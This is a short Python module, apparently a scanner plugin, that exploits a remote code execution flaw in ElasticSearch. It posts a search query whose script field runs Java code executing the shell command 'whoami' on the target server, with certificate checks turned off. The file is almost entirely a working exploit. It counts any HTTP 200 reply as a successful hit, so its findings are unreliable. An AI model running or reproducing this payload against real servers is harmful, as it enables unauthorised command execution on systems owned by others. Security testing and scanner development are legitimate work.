import json
from typing import Optional

import requests

from lib.log import logger


def run(url: str, port: int) -> Optional[str]:
    address = f"{url}:{port}"
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    try:
        # create doc
        requests.post(f"{address}/website/blog/", headers=headers, data='{"name":"test"}', timeout=9, verify=False)
        # execute
        payload = {
            "size": 1,
            "query": {"filtered": {"query": {"match_all": {}}}},
            "script_fields": {
                "command": {
                    "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"whoami\").getInputStream()).useDelimiter(\"\\\\A\").next();"
                }
            }
        }
        resp = requests.post(f"{address}/_search?pretty", headers=headers, data=json.dumps(payload), timeout=9,
                             verify=False)
        if resp.status_code == 200:
            return "ElasticSearch Remote Code Exec ~"
        logger.warning(f"Failed, status code: {resp.status_code}")
        return None
    except requests.RequestException as e:
        logger.error(f"Request failed: {str(e)}")
        return None
    except json.JSONDecodeError as e:
        logger.error(f"JSON decode failed: {str(e)}")
        return None
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        return None
